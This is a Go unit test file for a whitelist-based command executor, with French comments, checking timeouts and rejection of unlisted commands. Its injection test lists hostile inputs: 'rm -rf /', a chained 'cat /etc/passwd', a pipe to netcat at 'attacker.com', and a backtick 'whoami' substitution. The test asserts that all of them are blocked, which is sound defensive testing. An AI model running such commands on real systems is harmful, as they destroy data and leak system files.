package tools

import (
	"runtime"
	"testing"
	"time"
)

func TestExecuteCommand_NotWhitelisted(t *testing.T) {
	result := ExecuteCommand("rm -rf /")

	if result.Success {
		t.Fatal("non-whitelisted command must never succeed")
	}
	if result.TimedOut {
		t.Error("whitelist check should be instant, not timeout")
	}
	if result.Duration > time.Second {
		t.Error("whitelist check should be instant")
	}
}

func TestExecuteCommand_Timeout(t *testing.T) {
	if runtime.GOOS == "windows" {
		result := ExecuteCommandWithTimeout("uptime", 1*time.Nanosecond)
		if result.Success {
			t.Error("expected failure with 1ns timeout")
		}
		return
	}

	// Sur Linux — ajoute temporairement sleep dans les specs de test
	commandSpecs["sleep 5"] = CommandSpec{bin: "sleep", args: []string{"5"}}
	defer delete(commandSpecs, "sleep 5")

	result := ExecuteCommandWithTimeout("sleep 5", 200*time.Millisecond)
	if !result.TimedOut {
		t.Error("expected timeout for sleep 5 with 200ms limit")
	}
}

func TestExecuteCommand_ValidCommand(t *testing.T) {
	result := ExecuteCommandWithTimeout("uptime", 5*time.Second)

	if result.TimedOut {
		t.Error("valid command should not timeout with 5s limit")
	}
	if result.Duration <= 0 {
		t.Error("duration should be positive")
	}
}

func TestCommandResult_TimedOutDisplay(t *testing.T) {
	r := CommandResult{
		Command:  "test",
		TimedOut: true,
		Duration: 200 * time.Millisecond,
	}
	r.Display()
}

func TestExecuteCommand_DirectDispatch(t *testing.T) {
	// Vérifie que la spec existe pour chaque commande whitelistée
	expected := []string{"docker ps", "docker stats", "uptime", "df -h", "free -h"}
	for _, cmd := range expected {
		if _, ok := commandSpecs[cmd]; !ok {
			t.Errorf("command '%s' missing from commandSpecs", cmd)
		}
	}
}

func TestExecuteCommand_NoShellInjection(t *testing.T) {
	// Une tentative d'injection via une commande whitelistée modifiée
	// doit être bloquée par la whitelist
	injections := []string{
		"df -h; rm -rf /",
		"uptime && cat /etc/passwd",
		"free -h | nc attacker.com 4444",
		"docker ps`whoami`",
	}

	for _, cmd := range injections {
		result := ExecuteCommand(cmd)
		if result.Success {
			t.Errorf("injection attempt should be blocked: '%s'", cmd)
		}
		if result.Error == "" {
			t.Errorf("blocked command should have error message: '%s'", cmd)
		}
	}
}
